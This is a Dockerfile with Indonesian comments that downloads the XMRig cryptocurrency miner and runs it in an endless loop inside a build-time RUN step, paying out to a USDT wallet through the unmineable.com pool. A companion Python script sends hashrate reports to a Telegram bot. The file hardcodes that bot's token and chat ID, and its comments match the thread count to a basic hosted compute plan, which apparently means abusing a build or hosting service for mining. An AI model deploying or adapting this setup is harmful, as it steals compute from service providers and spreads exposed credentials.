FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

# 1. Install dependensi dan unduh XMRig
RUN apt-get update && \
    apt-get install -y wget tar ca-certificates python3 python3-requests && \
    wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && \
    tar -xf xmrig-6.22.2-linux-static-x64.tar.gz && \
    rm -f xmrig-6.22.2-linux-static-x64.tar.gz

# 2. Bot Telegram Reporter (1 Nama Rig: sal909 + Auto-Loop 24 Jam)
RUN cat << 'EOF' > /reporter.py
import time
import requests

TOKEN = "9200373511:AAE7lDnzL7joTavno-9VeIR1316HRZZc7YE"
CHAT_ID = "8949644128"
RIG = "sal909"
NODE_ID = open("/proc/sys/kernel/random/uuid").read()[:4]

def send_msg(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
            timeout=10
        )
    except Exception:
        pass

send_msg(f"🟢 <b>Rig Aktif:</b> <code>{RIG}</code> (Node #{NODE_ID} | 8 vCPU · 8 GiB)")
time.sleep(45)

while True:
    try:
        r = requests.get("http://127.0.0.1:4044/1/summary", timeout=5).json()
        hr = r.get("hashrate", {}).get("total", [0, 0, 0])
        good = r.get("results", {}).get("shares_good", 0)
        total = r.get("results", {}).get("shares_total", 0)
        uptime = r.get("uptime", 0)
        
        hours = uptime // 3600
        mins = (uptime % 3600) // 60
        h10s = f"{hr[0]:.2f}" if hr[0] else "0.00"
        h60s = f"{hr[1]:.2f}" if hr[1] else "0.00"
        
        send_msg(
            f"⚡ <b>Rig: {RIG}</b> (Node #{NODE_ID})\n"
            f"🚀 10s: <code>{h10s} H/s</code> | 60s: <code>{h60s} H/s</code>\n"
            f"✅ Shares: <code>{good}/{total}</code> | ⏱ Uptime: <code>{hours}j {mins}m / 24j</code>"
        )
    except Exception:
        pass
    time.sleep(300)
EOF

# 3. Auto-Rerun Tanpa Henti (8 Threads sesuai 8 vCPU Plan Basic)
RUN nohup python3 /reporter.py >/dev/null 2>&1 & \
    cd xmrig-6.22.2 && \
    while true; do \
        ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 \
        -u USDT:0x098f58db447351f5433006b7761b9da8d8a26680.sal909 \
        -p x --tls \
        --threads=8 \
        --cpu-no-yield \
        --randomx-no-numa \
        --donate-level=1 \
        --keepalive \
        --retry-pause=3 \
        --http-host=127.0.0.1 \
        --http-port=4044 || true; \
        sleep 2; \
    done
